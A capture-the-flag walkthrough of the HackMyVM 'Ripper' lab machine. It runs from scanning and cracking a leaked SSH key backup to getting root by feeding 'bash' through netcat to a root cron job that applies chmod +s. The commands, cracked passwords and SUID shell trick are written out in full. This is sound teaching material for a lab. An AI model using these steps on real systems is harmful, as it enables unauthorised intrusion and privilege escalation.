# HackMyVM — Ripper

> **Platform:** HackMyVM
> **Machine:** Ripper
> **Difficulty:** Linux / Privilege Escalation
> **OS:** Linux / Debian
> **Target IP:** `192.168.56.143`
> **Attack Type:** SSH Credential Discovery → Local Enumeration → Race Condition / SUID Abuse → Root

---

## Introduction

Today we are back with another **HackMyVM Linux-based machine** — **Ripper**.

Unlike some HackMyVM machines, the IP address was not provided directly on the machine banner, so the first step was to identify the target on our local VirtualBox network.

The overall attack path for this machine was:

```text
Network Discovery
      ↓
Port Scanning
      ↓
Web Enumeration
      ↓
Hidden SSH Private Key
      ↓
SSH Access as jack
      ↓
Credential Discovery
      ↓
SSH Access as helder
      ↓
Process Enumeration with pspy64
      ↓
Abuse Root-Owned Automation
      ↓
Bash SUID
      ↓
Root Shell
```

---

# 1. Identifying the Target IP

We first need to identify the IP address assigned to the Ripper machine.

For this, we can use `netdiscover` against the interface connected to the HackMyVM/VirtualBox network.

```bash
netdiscover -i eth1
```

> **Note:** Replace `eth1` with the interface connected to your lab network.

![Netdiscover output showing the Ripper machine IP](q1)

The scan returned several hosts:

```text
Currently scanning: 192.168.0.0/16   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00      1      60 Unknown vendor
 192.168.56.100  08:00:27:83:28:a6      1      60 PCS Systemtechnik
 192.168.56.143  08:00:27:03:c4:47      1      60 PCS Systemtechnik
```

The target machine was:

```text
192.168.56.143
```

So our **main target IP** is:

```text
192.168.56.143
```

---

# 2. Initial Nmap Scan

Now that we have the target IP, we can perform a full TCP port scan.

```bash
nmap -p- --min-rate 5000 192.168.56.143
```

![Initial Nmap port scan](q3)

The scan revealed two open ports:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

So we have:

| Port | Service | Purpose       |
| ---- | ------- | ------------- |
| 22   | SSH     | Remote access |
| 80   | HTTP    | Web server    |

Both services are worth investigating.

---

# 3. Service and Version Enumeration

Next, we perform service and version detection:

```bash
nmap -sC -sV 192.168.56.143
```

![Nmap service and version detection](q4)

The important results were:

```text
22/tcp open  ssh
OpenSSH 7.9p1 Debian 10+deb10u2

80/tcp open  http
Apache httpd 2.4.38 ((Debian))
```

The target appears to be running a Debian-based Linux system.

### Attack Surface

At this point our attack surface looks like:

```text
22/tcp → OpenSSH 7.9p1
80/tcp → Apache 2.4.38
```

The web server is the natural next place to investigate.

---

# 4. Web Enumeration

Opening:

```text
http://192.168.56.143/
```

reveals a simple maintenance page.

![Ripper maintenance page](q5)

The page itself does not expose much useful information, so we move toward content discovery.

---

# 5. Directory and File Enumeration

We start with `feroxbuster`:

```bash
feroxbuster -u http://192.168.56.143/
```

The initial scan did not reveal anything particularly interesting.

![Feroxbuster initial scan](q6)

The server mainly returned the standard responses:

```text
403 Forbidden
404 Not Found
200 OK
```

The only obvious resource was the main page.

---

# 6. Gobuster Enumeration

We also tried `gobuster` to verify the results from another directory enumeration tool.

```bash
gobuster dir \
-u http://192.168.56.143/ \
-w /usr/share/wordlists/dirb/common.txt
```

![Gobuster enumeration](q7)

Among the results we found:

```text
/index.html       → 200
/.htaccess        → 403
/.htpasswd        → 403
```

Nothing immediately exploitable was discovered.

However, one important clue was present.

The machine identifies itself with the name **Ripper**, and the web page contains information that can potentially help us think about usernames.

Since SSH is exposed, identifying valid usernames becomes valuable.

---

# 7. Discovering the SSH Private Key

Instead of blindly attacking SSH, we continued with deeper web content discovery.

This time we performed a more focused `ffuf` scan looking for common files and backup files.

For example:

```bash
ffuf -u http://192.168.56.143/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![FFUF discovering the backup SSH private key](q8)

This eventually revealed:

```text
id_rsa.bak
```

A backup of an SSH private key is extremely valuable.

We downloaded the file and inspected it.

Because the private key was encrypted, we first converted it into a format that John the Ripper could process.

---

# 8. Cracking the SSH Private-Key Passphrase

We used `ssh2john`:

```bash
ssh2john id_rsa.bak > hash
```

Then we used John the Ripper with the `rockyou.txt` wordlist:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![John the Ripper cracking the SSH private-key passphrase](q9)

John successfully recovered the passphrase:

```text
bananas
```

We can now use the recovered private key to authenticate through SSH.

---

# 9. SSH Access as jack

We corrected the permissions of the private key if necessary:

```bash
chmod 600 id_rsa.bak
```

Then connected to SSH:

```bash
ssh -i id_rsa.bak jack@192.168.56.143
```

![SSH access as jack](q10)

We successfully obtained a shell as:

```text
jack
```

At this point, we have our first foothold.

---

# 10. Local Enumeration

With shell access, we need to understand the target system and identify a path toward privilege escalation.

A common first step is running **LinPEAS**.

We transferred `linpeas.sh` to the target and executed it:

```bash
chmod +x linpeas.sh
./linpeas.sh
```

During enumeration, LinPEAS reported several potentially relevant kernel vulnerabilities.

---

# 11. Kernel Vulnerability Enumeration

Among the results were:

```text
CVE-2019-13272
CVE-2021-3493
CVE-2021-22555
```

For example:

```text
CVE: CVE-2021-3493
Name: Ubuntu OverlayFS
Match data: pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64
Tags: ubuntu=(14.04|16.04|18.04|20.04|20.10)
Rank: 1
Details: Only Ubuntu is affected.
```

![LinPEAS kernel vulnerability findings](q11)

Although kernel exploits are worth investigating, vulnerability scanners often report potential matches based on version information alone.

In this case, the OverlayFS exploit was not the intended route, and the target is Debian rather than Ubuntu.

This is an important lesson:

> **Do not blindly exploit every CVE reported by LinPEAS. Validate the operating system, kernel version, configuration, and exploit prerequisites first.**

So instead of continuing with kernel exploitation, we moved toward deeper local enumeration.

---

# 12. Searching for Credentials

LinPEAS also revealed something much more useful:

```text
Hashes inside passwd file? ........ No
Writable passwd file? ............. No
Credentials in fstab/mtab? ........ No
Can I read shadow files? ........... No
Can I read opasswd file? ........... No

Can I read opasswd file? ........... jack:Il0V3lipt0n1c3t3a
```

This exposed a credential associated with `jack`:

```text
jack:Il0V3lipt0n1c3t3a
```

The password was:

```text
Il0V3lipt0n1c3t3a
```

We also discovered the `helder` account during our enumeration.

This gave us a potential route to move from `jack` to another local user.

---

# 13. Switching to helder

Using the discovered password, we were able to authenticate as `helder`.

```bash
ssh helder@192.168.56.143
```

Or, if switching locally was possible:

```bash
su helder
```

After authentication:

```bash
whoami
```

returned:

```text
helder
```

We also found the user flag in the home directory.

![User flag](q12)

At this point:

```text
jack
 ↓
credentials
 ↓
helder
 ↓
user.txt
```

The initial foothold was complete.

Now it was time for **privilege escalation**.

---

# 14. Looking for Root Processes

Kernel exploits were not giving us the intended path, so we looked at processes running in the background.

For this, **pspy64** is extremely useful.

`pspy` allows us to monitor processes without requiring root privileges.

We transferred `pspy64` to the machine and executed it:

```bash
chmod +x pspy64
./pspy64
```

While monitoring the machine, we noticed a very interesting root-owned process:

```text
2026/08/13 14:30:01 CMD: UID=0 PID=709 |
/bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out &&
if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ;
then chmod +s "/usr/bin/$(cat /root/.local/out)" ;
fi
```

This was the critical discovery.

---

# 15. Understanding the Root Process

Let's break the command down.

The root process starts with:

```bash
nc -vv -q 1 localhost 10000 > /root/.local/out
```

So root connects to:

```text
localhost:10000
```

and redirects whatever it receives into:

```text
/root/.local/out
```

Then the process compares two files:

```bash
/root/.local/helder.txt
```

and:

```bash
/home/helder/passwd.txt
```

The comparison is:

```bash
if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ]
```

If the contents match, it executes:

```bash
chmod +s "/usr/bin/$(cat /root/.local/out)"
```

This is the vulnerability.

The filename passed to `chmod` is influenced by data received through the local network connection.

In simplified form:

```text
Our input
   ↓
localhost:10000
   ↓
/root/.local/out
   ↓
/usr/bin/$(cat /root/.local/out)
   ↓
chmod +s
   ↓
SUID executable
```

Since the process runs as **root**, the resulting SUID bit is applied with root ownership.

---

# 16. Preparing the Required Password File

The root process expects the contents of:

```text
/home/helder/passwd.txt
```

to match:

```text
/root/.local/helder.txt
```

We therefore created the required file:

```bash
echo "Il0V3lipt0n1c3t3a" > /home/helder/passwd.txt
```

The value came from the credential discovered during our local enumeration.

---

# 17. Supplying the SUID Target

The next part is controlling what the root process writes to:

```text
/root/.local/out
```

We want:

```text
bash
```

because the root process will effectively execute:

```bash
chmod +s /usr/bin/bash
```

We therefore prepared:

```bash
echo "bash" > /tmp/root
```

Then we listened on port `10000`:

```bash
nc -lnvp 10000 < /tmp/root
```

We received the expected local connection:

```text
listening on [any] 10000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60368
```

This confirms that the root-owned process was indeed connecting back to our listener.

---

# 18. Understanding the Bash SUID Step

Initially, `/usr/bin/bash` looked like this:

```bash
ls -la /usr/bin/bash
```

```text
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /usr/bin/bash
```

Notice that there was **no `s`** in the permission string.

That means Bash was not yet SUID.

After the vulnerable root process receives:

```text
bash
```

and successfully passes the password comparison, it runs:

```bash
chmod +s /usr/bin/bash
```

This changes the permission structure to something conceptually like:

```text
-rwsr-xr-x
```

The important character is:

```text
s
```

which represents the SUID bit.

---

# 19. Getting the Root Shell

Once `/usr/bin/bash` has the SUID bit set, we can launch Bash in privileged mode:

```bash
bash -p
```

The `-p` option is important here.

It tells Bash to operate in privileged mode rather than dropping the elevated effective privileges inherited from the SUID execution.

We can verify the result with:

```bash
id
```

The result was:

```text
uid=1001(helder) gid=1001(helder) euid=0(root) egid=0(root) groups=0(root),1001(helder)
```

The key part is:

```text
euid=0(root)
```

Even though the real user ID remains:

```text
uid=1001(helder)
```

the **effective UID is root**.

We can confirm this with:

```bash
whoami
```

which returned:

```text
root
```

At this point, we have successfully escalated privileges.

---

# 20. Reading root.txt

We can now access the root user's home directory:

```bash
cd /root/
```

Then:

```bash
ls
```

reveals:

```text
root.txt
```

Finally:

```bash
cat /root/root.txt
```

![Root flag](q13)

And with that, the **Ripper** machine is completely compromised.

---

# Attack Chain Summary

The complete attack chain was:

```text
                    Ripper
                       |
                       v
              Network Discovery
                       |
                       v
             192.168.56.143
                       |
                       v
                Nmap Scan
                       |
              +--------+--------+
              |                 |
             SSH               HTTP
              |                 |
              |          Web Enumeration
              |                 |
              |          id_rsa.bak
              |                 |
              |          ssh2john
              |                 |
              |          John the Ripper
              |                 |
              |            Passphrase
              |                 |
              +--------> SSH as jack
                                |
                                v
                         Local Enumeration
                                |
                                v
                      Credential Discovery
                                |
                                v
                         SSH as helder
                                |
                                v
                           pspy64
                                |
                                v
                   Root-owned nc process
                                |
                                v
                  Control /root/.local/out
                                |
                                v
                     chmod +s /usr/bin/bash
                                |
                                v
                            bash -p
                                |
                                v
                           euid=0(root)
                                |
                                v
                           root.txt
```

---

# Key Takeaways

## 1. Do not stop at the homepage

A simple maintenance page does not necessarily mean the web service is useless.

Backup files, configuration files, old keys, and forgotten resources can expose the next stage of an attack.

---

## 2. Always look for backup files

The discovery of:

```text
id_rsa.bak
```

was the turning point in the initial compromise.

Files such as:

```text
.bak
.old
.backup
.save
.zip
.tar
.tar.gz
~
```

can sometimes expose sensitive information.

---

## 3. Private SSH keys may still require a passphrase

Finding an SSH private key does not necessarily mean immediate access.

In this case:

```text
id_rsa.bak
```

was encrypted.

Using:

```bash
ssh2john
```

and:

```bash
john
```

allowed us to recover its passphrase.

---

## 4. Don't blindly trust automated CVE results

LinPEAS identified multiple potential kernel vulnerabilities.

However, not every reported CVE is exploitable on every machine.

Always verify:

```text
Operating system
Kernel version
Architecture
Configuration
Exploit prerequisites
```

before spending time on a kernel exploit.

---

## 5. pspy is extremely useful

One of the most important lessons from this machine is the value of monitoring background processes.

`pspy` revealed a root process that was not obvious from standard enumeration.

The command:

```bash
nc -vv -q 1 localhost 10000 > /root/.local/out
```

combined with:

```bash
chmod +s "/usr/bin/$(cat /root/.local/out)"
```

created a direct privilege-escalation opportunity.

---

## 6. SUID changes the game

The vulnerable process effectively allowed us to make a root-owned executable SUID.

Once:

```text
/usr/bin/bash
```

became:

```text
-rwsr-xr-x
```

we could use:

```bash
bash -p
```

to retain the elevated effective privileges.

The final proof was:

```text
uid=1001(helder)
euid=0(root)
```

---

# Final Attack Summary

| Stage | Technique         | Result                             |
| ----- | ----------------- | ---------------------------------- |
| 1     | `netdiscover`     | Discovered target IP               |
| 2     | `nmap`            | Found SSH and HTTP                 |
| 3     | Web enumeration   | Investigated maintenance page      |
| 4     | `ffuf`            | Discovered `id_rsa.bak`            |
| 5     | `ssh2john`        | Prepared SSH key hash              |
| 6     | John the Ripper   | Cracked key passphrase             |
| 7     | SSH               | Obtained `jack`                    |
| 8     | Local enumeration | Discovered credentials             |
| 9     | SSH               | Obtained `helder`                  |
| 10    | `pspy64`          | Discovered root automation         |
| 11    | Netcat abuse      | Controlled `/root/.local/out`      |
| 12    | `chmod +s`        | Turned `/usr/bin/bash` into SUID   |
| 13    | `bash -p`         | Obtained effective root privileges |
| 14    | `/root/root.txt`  | Captured root flag                 |

---

# Conclusion

The **HackMyVM Ripper** machine was a great example of why privilege escalation is not always about finding a kernel exploit.

The initial foothold came from a forgotten SSH private-key backup exposed through the web server. After moving through the available users, the real privilege-escalation path was discovered by monitoring background processes with `pspy64`.

The critical vulnerability was a root-owned process that trusted attacker-controlled input when deciding which executable should receive the SUID bit.

The final chain was:

```text
id_rsa.bak
    ↓
SSH key passphrase
    ↓
jack
    ↓
credential discovery
    ↓
helder
    ↓
pspy64
    ↓
root-owned netcat process
    ↓
controlled output
    ↓
SUID /usr/bin/bash
    ↓
bash -p
    ↓
root
```

**Ripper was successfully compromised from initial network discovery all the way to root.**
